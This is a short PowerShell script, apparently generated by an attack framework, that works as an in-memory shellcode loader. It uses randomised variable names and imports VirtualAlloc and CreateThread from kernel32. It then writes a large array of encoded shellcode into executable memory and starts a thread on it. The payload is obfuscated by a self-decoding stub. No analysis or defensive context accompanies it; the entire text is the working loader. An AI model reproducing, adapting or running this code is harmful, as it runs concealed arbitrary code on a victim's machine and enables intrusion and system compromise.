$avBgpxAdvQzoD = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$ANzMwkBlBL = Add-Type -memberDefinition $avBgpxAdvQzoD -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $JRTHBwmUgGodBH = 0xba,0xd2,0x14,0xac,0xd1,0xda,0xc2,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x88,0x31,0x53,0x15,0x83,0xeb,0xfc,0x3,0x53,0x11,0xe2,0x27,0xcf,0x7b,0x6f,0x87,0xef,0xf,0xab,0xde,0x64,0x34,0x38,0xbf,0xb7,0xfd,0x71,0xbd,0x89,0x8a,0x66,0xc2,0x9e,0x63,0xa,0x6b,0x83,0xe2,0xc2,0xe6,0xd6,0x37,0x4e,0xee,0xa7,0x1d,0x61,0x62,0xe7,0x8d,0x91,0x3d,0x88,0xaf,0x6,0x67,0x6d,0xc2,0x56,0xf8,0xb4,0xf5,0x8,0x6b,0xd5,0xbd,0x61,0x82,0xa4,0xc6,0xea,0x15,0x67,0xbf,0xee,0x7d,0x16,0xbc,0xd5,0x30,0x1e,0xa8,0x7d,0xf9,0xdb,0xe2,0x29,0x3e,0x25,0x39,0x99,0x8e,0x32,0xdc,0xa8,0x98,0x14,0xa9,0xd5,0xe1,0xe1,0xe0,0xb4,0x68,0x36,0x2b,0x64,0x6e,0xcb,0x39,0x9b,0x51,0x1f,0x9c,0x13,0x7f,0x1e,0x1d,0x10,0xac,0x54,0x5,0xa8,0x28,0xc9,0xdb,0x2a,0xb1,0xe7,0x16,0xbc,0x12,0xab,0xb2,0xa8,0x42,0xe2,0x75,0x8c,0xfd,0x97,0xc2,0x25,0x7f,0x23,0xfb,0xf3,0xdd,0xaf,0xcf,0xe9,0xe9,0x64,0x46,0x7f,0x86,0x45,0x45,0xc2,0x9e,0xf2,0x2c,0xc0,0xbd,0x52,0x4e,0x3c,0x3c,0xa3,0xe2,0xc,0x1,0x7f,0x14,0x7e,0x81,0xc8,0x8d,0x84,0xdd,0x6d,0xe1,0xbf,0xcd,0x57,0xfd,0x5,0xcb,0x49,0x29,0x58,0x36,0x6e,0xaf,0x19,0x20,0xe4,0x32,0x6e,0x58,0x5,0x2d,0x47,0x8e,0x56,0xa3,0x50,0x29,0xaa,0x98,0x63,0xa0,0x1e,0x82,0x35,0x63,0x29,0x4a,0xab,0x71,0xe7,0xed,0x16,0xd6,0xff,0x8f,0x1c,0xfd,0x7b,0x5d,0x56,0x37,0x5f,0x60,0xbc,0xeb,0xfc,0xd8,0xd1,0x13,0x92,0xde,0xe7,0x60,0x84,0x28,0x3f,0xd8,0x25,0x42,0x37,0x4e,0xe8,0xea,0xe4,0xb,0x90,0x21,0x4,0xf1,0xb4,0xd8,0x76,0x2b,0xe6,0x7c,0x15,0xbf,0x89,0xfb,0x34,0x65,0x9e,0xd7,0xf,0x89,0xe2,0x20,0x5b,0xa5,0xc9,0x5c,0xd,0x72,0xe3,0xc5,0x67,0x15,0x19,0xf9,0x4b,0x2d,0x20,0x83,0xbe,0x8f,0x95,0xc7,0x21,0xfb,0xdd,0x1f,0x63,0x9a,0xc2,0x49,0xe4,0xf9,0xee,0xc6,0x12,0x5,0x5a,0xc9,0xb1,0xb4,0xef,0x1d,0x8c,0xc5,0xf0,0xb0,0xf,0x60,0xc2,0x73,0x9c,0x87,0xfa,0xde,0x66,0x53,0x11,0x15,0xd4,0x62,0xf4,0x76,0x53,0x3f,0x93,0xaf,0x1e,0xaf,0x37,0x5d,0x7e,0xf1,0xe,0x77,0xa6,0x7d,0x2d,0xdb,0xf7,0x7e,0xb,0x31,0x82,0xcb,0xdf,0x9e,0x17,0x85,0xfb,0xa3,0xdf,0xb,0xe8,0x63,0x44,0x14,0xa7,0xe6,0x30,0xe4,0xfb,0xac,0x2c,0x45,0xf2,0x27,0x2b,0x55,0x90,0xd7,0xf4,0xf4,0xea,0x14,0x15,0x0,0x41,0xb,0x5e,0xa9,0x3c,0x50,0xda,0x88,0x3c,0x74,0x94,0x82,0x51,0x6a,0x7,0x64,0x49,0x98,0x31,0xb3,0xe1,0x38,0x78,0xe2,0xa,0xe5,0x4b,0x56,0xd,0x21,0x52,0xa,0xc4,0x7d,0xd6,0x81,0xa4,0xe0,0x88,0x12,0x1a,0x71,0xa6,0x21,0xc6,0x88,0xc4,0x4a,0x25,0x9b,0xbe,0x11,0xb6,0x77,0x15,0xaf,0x2a,0x38,0x54,0x29,0xba,0xe5,0xb9,0x4a,0xb3,0xa9,0x21,0x6e,0xd4,0xa5,0x55,0x9e,0x5d,0x97,0xe8,0xa7,0xbc,0x91,0x49,0xee,0xb6,0x2a,0x8c,0x72,0x23,0x3f,0xc8,0x5c,0xa3,0x5d,0x48,0x60,0x87,0x1b,0xbe,0x35,0x7d,0xd8,0x67,0x91,0xc8,0x6c,0x4,0xeb,0x67,0x25,0xb2,0x76,0x31,0xdb,0x97,0xf9,0x4f,0x19,0xf3,0x88,0xeb,0x9b,0x23,0x62,0xcf,0x7c,0xf0,0x17,0xae,0x2b,0xa4,0xb4,0x7b,0xd1,0xc0,0x40,0xb1,0x32,0x13,0xbf,0x8,0xbc,0xc0,0x56,0x5,0xac,0x56,0xfb,0x50,0x15,0xbd,0xfd,0xcf,0x62,0xb7,0x83,0xaf,0x34,0x33,0x73,0x97,0x98,0x79,0x9d,0x3c,0x15,0xc8


$JDEljMvqdnwmM = $ANzMwkBlBL::VirtualAlloc(0,[Math]::Max($JRTHBwmUgGodBH.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($JRTHBwmUgGodBH,0,$JDEljMvqdnwmM,$JRTHBwmUgGodBH.Length)

$ANzMwkBlBL::CreateThread(0,0,$JDEljMvqdnwmM,0,0,0)
